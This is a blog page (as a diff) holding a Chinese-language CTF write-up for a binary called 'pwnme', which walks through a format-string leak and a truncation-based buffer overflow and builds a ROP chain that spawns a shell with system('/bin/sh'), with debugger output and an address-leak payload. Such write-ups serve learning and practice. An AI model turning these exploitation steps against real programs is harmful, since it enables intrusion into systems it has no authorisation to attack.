@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>500年前的题 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Overview Safeguard、operation and analysis  1234567pic@ubuntu:~&#x2F;Desktop$ checksec pwnme[*] &#x27;&#x2F;home&#x2F;pic&#x2F;Desktop&#x2F;pwnme&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="500年前的题">
+<meta property="og:url" content="http://example.com/2019/05/09/2019-05-09-pwnme/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Overview Safeguard、operation and analysis  1234567pic@ubuntu:~&#x2F;Desktop$ checksec pwnme[*] &#x27;&#x2F;home&#x2F;pic&#x2F;Desktop&#x2F;pwnme&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canar">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-05-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2019-05-09-pwnme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/05/09/2019-05-09-pwnme/" class="article-date">
+  <time class="dt-published" datetime="2019-05-08T16:00:00.000Z" itemprop="datePublished">2019-05-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      500年前的题
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><blockquote>
+<p>Safeguard、operation and analysis</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ checksec pwnme</span><br><span class="line">[*] &#x27;/home/pic/Desktop/pwnme&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>发现本题开启了<code>RELRO</code>和<code>NX</code>，意味着我们不能随便搞got表和直接往栈上写shellcode，我们来分析本题逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./pwnme </span><br><span class="line">**********************************************</span><br><span class="line">*                                            *</span><br><span class="line">*              Have fun!Pwn me               *</span><br><span class="line">*                                            *</span><br><span class="line">**********************************************</span><br><span class="line">Register Account first!</span><br><span class="line">Input your username(max lenth:40): </span><br><span class="line">1</span><br><span class="line">Input your password(max lenth:40): </span><br><span class="line">1</span><br><span class="line">Register Success!!</span><br></pre></td></tr></table></figure>
+
+<p>本题首先进行注册之后弹出3个选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit System:</span><br><span class="line">&gt;1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit System:</span><br><span class="line">&gt;2</span><br><span class="line">please input new username(max lenth:20): </span><br><span class="line">1</span><br><span class="line">please input new password(max lenth:20): </span><br><span class="line">1</span><br><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit System:</span><br><span class="line">&gt;3</span><br><span class="line">byebyeT.T</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们到ida中进行下一步分析，发现在输出函数即选项1中存在格式化字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_400AD1(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&amp;formata);</span><br><span class="line">  return printf(&amp;a9 + 4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就没有然后了，我并不知道其他漏洞点，在看了大佬的wp后get到了一个新的漏洞方式<strong>类型转换不当导致缓冲区溢出</strong>，在编辑函数即选项2中的修改密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( (_BYTE)v12 &amp;&amp; (unsigned __int8)v12 &lt;= 0x14u )</span><br></pre></td></tr></table></figure>
+
+<p>看到v12被类型转换，将<code>unsigned int v12</code>转为<code>_BYTE</code>，也即最后一个字节小于0x14u即可，之后输入最后字节满足if语句即可，我们找到了溢出点和泄露点，可以开始思考怎么利用了</p>
+<h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><blockquote>
+<p>how to exploit vulnerability</p>
+</blockquote>
+<p>我们最后要做的便是执行<code>system(&quot;/bin/sh&quot;)</code>，首先找到system地址，根据格式化字符串漏洞，我们利用DynELF把system的地址爆破出来，之后利用缓冲区溢出构造一个rop直接去执行获得shell。行，下面看一下具体过程我们先说rop的构造，毕竟这是这题难点</p>
+<p>先找到溢出点，直接用<strong>cyclic</strong>整0x100个即256个，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ cyclic 256</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac</span><br></pre></td></tr></table></figure>
+
+<p>直接贴到程序中，由于大于0x00007fffffffffff，程序正常爆炸，我们直接找到esp的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x7fffffffe390 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line">RBX  0x0</span><br><span class="line">RCX  0x603660 ◂— 0x0</span><br><span class="line">RDX  0x10</span><br><span class="line">RDI  0x7fffffffe390 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line">RSI  0x603670 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line">R8   0x1</span><br><span class="line">R9   0x7fffffffe380 ◂— 0x111004010a8</span><br><span class="line">R10  0x603870 ◂— 0x0</span><br><span class="line">R11  0x7fffffffe481 ◂— &#x27;aaclaacmaacnaacoaacpaacqaacraac\n&#x27;</span><br><span class="line">R12  0x400770 ◂— xor    ebp, ebp</span><br><span class="line">R13  0x7fffffffe5c0 ◂— 0x1</span><br><span class="line">R14  0x0</span><br><span class="line">R15  0x0</span><br><span class="line">RBP  0x6161616a61616169 (&#x27;iaaajaaa&#x27;)</span><br><span class="line">RSP  0x7fffffffe3b8 ◂— 0x6161616c6161616b (&#x27;kaaalaaa&#x27;)</span><br><span class="line">RIP  0x400ad0 ◂— ret    </span><br></pre></td></tr></table></figure>
+
+<p>直接找到溢出点为40</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ cyclic -l 0x6161616b</span><br><span class="line">40</span><br></pre></td></tr></table></figure>
+
+<p>之后直接向后写，我们的思路是先利用read在bss端写字符串，然后pop到rdi，直接到system里执行，所以一个完整的rop链是</p>
+<p><code>&#39;A&#39;*40+read(0,bss_addr,8)+pop rdi+bss_addr+system(rdi)</code></p>
+<p>之后就是找可利用的gadget了，根据<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ox9A82/p/5487725.html">大佬</a>的博客发现有两个通用的，还有一个很难找的<code>pop rdi</code>，但是有<code>pop r15</code>,利用该<a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm">网站</a>看看机器码，该汇编的机器码是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:  41 5f                   pop    r15</span><br></pre></td></tr></table></figure>
+
+<p>而<code>pop rdi</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:  5f                      pop    rdi</span><br></pre></td></tr></table></figure>
+
+<p>,差一个字节，所以也有了，这些代码在ida中找到了，直接贴出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400EB0                 mov     rdx, r13</span><br><span class="line">.text:0000000000400EB3                 mov     rsi, r14</span><br><span class="line">.text:0000000000400EB6                 mov     edi, r15d</span><br><span class="line">.text:0000000000400EB9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:0000000000400EBD                 add     rbx, 1</span><br><span class="line">.text:0000000000400EC1                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400EC4                 jnz     short loc_400EB0</span><br><span class="line">.text:0000000000400EC6</span><br><span class="line">.text:0000000000400EC6 loc_400EC6:                             ; CODE XREF: init+36↑j</span><br><span class="line">.text:0000000000400EC6                 add     rsp, 8</span><br><span class="line">.text:0000000000400ECA                 pop     rbx</span><br><span class="line">.text:0000000000400ECB                 pop     rbp</span><br><span class="line">.text:0000000000400ECC                 pop     r12</span><br><span class="line">.text:0000000000400ECE                 pop     r13</span><br><span class="line">.text:0000000000400ED0                 pop     r14</span><br><span class="line">.text:0000000000400ED2                 pop     r15</span><br><span class="line">.text:0000000000400ED4                 retn</span><br></pre></td></tr></table></figure>
+
+<p>所以具体的rop链为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27;*40+0000000000400ECA + 0 + 1 + read + 8 + bss_addr + 0 + 0000000000400EB0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0000000000400ED3 + bss_addr + system</span><br></pre></td></tr></table></figure>
+
+<p>然后后边用<code>A</code>凑齐，即可起shell，下面补充一下格式化字符串的利用，在用<code>aaaa%n$x</code>测试时发现在8的时候是字符串起始位置，然后很奇怪，看大佬的wp发现利用输出密码时才能泄露，下面列出该漏洞的伪exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;please input new username(max lenth:20): \n&#x27;   =&gt;  &#x27;%11$sflag&#x27;</span><br><span class="line">&#x27;please input new password(max lenth:20): \n&#x27;   =&gt;  &#x27;aaaa&#x27;+p64(address)</span><br></pre></td></tr></table></figure>
+
+<p>通过ida可以发现两个字符串相差16个字节偏移为4，即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8   起始位置</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11  存放address</span><br></pre></td></tr></table></figure>
+
+<p>通过这个便可泄露出来addr，很爽。做这题真的花了好久好久，还是太菜了~~~</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/05/09/2019-05-09-pwnme/" data-id="cuidZQgdrM1gIZ5rgUUCY8sFb" data-title="500年前的题" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/05/24/2019-05-24-jeasycanary/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          吉林网络安全省赛
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/05/05/2019-05-05-DDCTFRe1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">DDCTF</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
